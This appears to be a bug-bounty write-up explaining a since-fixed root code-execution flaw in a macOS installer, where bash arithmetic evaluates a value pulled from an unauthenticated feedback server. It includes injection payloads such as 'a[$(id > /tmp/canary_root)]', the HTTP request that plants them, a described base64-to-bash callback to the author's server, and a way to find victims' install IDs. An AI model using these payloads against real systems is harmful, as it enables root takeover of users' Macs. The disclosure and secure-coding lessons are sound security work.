---
title:       "Root RCE in a macOS installer: bash arithmetic runs whatever you put in it"
summary:     "An installation script added one to a number that came from the server. The problem is that in bash \"adding\" means \"evaluating\", and that number could be written by anyone on the internet without an account. Report accepted and rewarded."
date:        2026-08-10 18:40:00 +0100
lang:        en
ref:         rce-instalador-macos-aritmetica
image:       /assets/img/og/rce-instalador-macos-aritmetica-en.png
permalink:   /en/writeups/macos-installer-arithmetic-rce/

severity:    high
cvss:        "8.8"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-306"
vuln_class:  "Injection"
target_type: "Desktop installer (macOS)"
platform:    "YesWeHack"
status:      "Fixed"
reward:      "Rewarded"
tags:        [rce, macos, bash, installer, root, command-injection]

takeaways:
  - "In bash, `$(( ))` and `[[ … -ge … ]]` **evaluate** their contents. They are not innocent comparisons: they are an open interpreter."
  - "Quoting a variable does not save you inside an arithmetic context. The only thing that works is validating it really is a number."
  - "Desktop installers run as root and almost nobody looks at them. They are prime attack surface, and usually one `curl` away."
  - "If a script asks a server for data, always ask yourself who can write to that server."
---

A macOS `.pkg` can run two scripts when it installs, `preinstall` and `postinstall`, and if
the package asks for it they run **as root**. An installer is also a public file: you
download it and read the code that is about to run with full privileges on thousands of
machines.

```bash
pkgutil --expand-full installer.pkg /tmp/opened
cat /tmp/opened/*.pkg/Scripts/postinstall
```

## The line

```bash
# prepare data for feedback server
new_installation_count=$((install_count + 1))
```

An addition. But `$(( ))` in bash does not add: it **evaluates**. And evaluating includes
running whatever it finds inside, because it allows array indexes and to resolve the index
it has to look at what is between the brackets:

```bash
number='a[$(touch /tmp/gotcha)]'
echo $((number + 1))      # 1  (the empty index is 0, plus one)
ls /tmp/gotcha            # the file exists
```

<div class="warn" markdown="1">
**Quoting does not protect you here.** `echo $(( "$number" + 1 ))` runs just the same:
quoting stops the shell splitting the variable, not evaluating it. Same with
`[[ "$x" -ge 10 ]]`. With a single bracket — POSIX `test` — it does not happen: you get
"integer expression expected" and nothing runs.
</div>

## Where the number came from

I traced the variable backwards:

```bash
curl_data=$(curl -s "https://feedback.example.tld/v2/feedback/${install_id}?plain=1")

while IFS=':' read -r name value; do
    case "$name" in
        *installCount*) install_count="${value//\"/}" ;;
    esac
done <<< "$curl_data"
```

The server decides it. So the question becomes who can write to that server.

## Anyone

No account, no token:

```http
POST /v2/feedback?plain=1 HTTP/2
Host: feedback.example.tld
Content-Type: application/json

{"clickId":"<my-canary-id>",
 "clickData":{"custom":{"installCount":"a[$(id > /tmp/canary_root)]"}}}
```

```http
HTTP/2 200 OK
```

And reading it back, the value returned byte for byte, nothing filtered.

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/02-payload-en-el-servidor.png' | relative_url }}"
       alt="Terminal: reading the stored record back, the installationCounter field contains a[$(echo ...base64... | openssl base64 -d -A | bash)]">
  <figcaption>The value, already stored on the server and read back. Where a number should be there is a command substitution: <code>a[$(…)]</code>. The base64 is an <code>id</code> and a call to my own server.</figcaption>
</figure>

That left the victim's `install_id`, and it was not a secret either: the script takes it
from the downloaded file's name and from the metadata macOS attaches to it.

```bash
mdls -name kMDItemWhereFroms installer_<install_id>.pkg
```

It travels glued to the installer. Anyone sharing theirs over a chat or an affiliate link
is sharing the identifier.

## The chain

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-cadena.svg' | relative_url }}"
       alt="Diagram: the attacker writes to the feedback server without authentication, the victim installs, the script downloads the value and evaluates it as root">
  <figcaption>Nobody validates anything along the way. The value goes in as text and comes out as an order.</figcaption>
</figure>

1. The attacker writes the value to the feedback server. **No account.**
2. The victim installs or reinstalls.
3. The `postinstall`, **as root**, downloads that value.
4. The parsing loop puts it in a variable, stripping only the quotes.
5. `$((install_count + 1))` evaluates it.

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-bash-evalua.png' | relative_url }}"
       alt="macOS terminal: the signed package is expanded, its postinstall is run with sudo, and bash fails with «syntax error: operand expected» while trying to evaluate the downloaded content as arithmetic">
  <figcaption>The signed package's <code>postinstall</code>, running as root. Bash complains <code>syntax error: operand expected</code> while trying to <strong>evaluate</strong> what it has just downloaded: proof that the value lands in <code>$(( ))</code>.</figcaption>
</figure>

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/01-callback.png' | relative_url }}"
       alt="Out-of-band listener receiving two callbacks from the machine where the install ran: a DNS interaction and, a second later, an HTTP POST request. The source IP addresses are covered">
  <figcaption>A second after the install, the machine calls my listener: first it resolves the domain, then it sends the <code>POST</code>. The code ran. The source IPs are mine and are covered.</figcaption>
</figure>

## And the victim sees nothing

```bash
# always exit with code 0 to not show any error in the installer
trap finish EXIT
finish() { exit 0; }
```

The script always reports success. If my command breaks the install halfway through, the
installer still shows the green tick. It did not use `set -u` or `set -e` either.

## Impact

<div class="impact" markdown="1">
**Impact.** Arbitrary command execution **as root** on the victim's Mac when installing or
reinstalling. Total control of the machine: reading any file, installing persistence,
stealing credentials. No account on the attacker's side and not a single visible hint for
the victim, who sees an installation that finished successfully.
</div>
